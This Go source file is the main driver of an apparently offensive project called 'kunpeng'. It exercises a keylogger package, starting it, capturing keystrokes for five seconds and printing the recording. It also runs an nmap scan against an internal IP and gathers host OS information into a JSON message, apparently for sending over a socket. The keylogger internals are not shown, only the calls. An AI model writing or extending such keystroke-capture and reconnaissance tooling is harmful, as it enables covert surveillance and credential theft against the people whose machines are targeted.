package main

import (
	"encoding/json"
	"kunpeng/config"
	"kunpeng/hackpackage"
	"kunpeng/keylogger"
	"kunpeng/service"
	"time"
)

//
//func main() {
//
//	kellogg := &keylogger.KeyLoggerInfo{}
//	kellogg.KeyLoggerOver = false
//	go keylogger.RunKeyLogger(kellogg)
//	time.Sleep(5000 * time.Millisecond)
//	kellogg.KeyLoggerOver = true
//	print(kellogg.Recording)
//	var input string
//	fmt.Scanln(&input)
//}
type SocketInfo struct {
	ResultCode int
	ResultMsg  string
}

func main() {
	testJson()
}
func TestKeyogger() {
	if !keylogger.StartKeyLogger() {
		print("stepone :keylogger has running!")
	}
	if !keylogger.StartKeyLogger() {
		print("steptwo :keylogger has running!")
	}
	time.Sleep(5000 * time.Millisecond)

	print(keylogger.GetKeyRecording())
	if !keylogger.EndKeyLogger() {
		print("steptwo:keylogger didn't open")
	}
	if !keylogger.EndKeyLogger() {
		print("steptwo:keylogger didn't open")
	}
	if !keylogger.StartKeyLogger() {
		print("stepone :keylogger has running!")
	}
	if !keylogger.StartKeyLogger() {
		print("steptwo :keylogger has running!")
	}
}
func TestNmap() {

	service.GetNmapInfoFromIp("10.59.13.137")

}
func testJson() {
	msg := SocketInfo{config.Result_Code_ReturnOsInfo, hackpackage.GetOSInformation()}
	print(msg.ResultMsg)
	print(msg.ResultCode)
	jsonstring, err := json.Marshal(&msg)
	print(err)
	print(string(jsonstring))

}
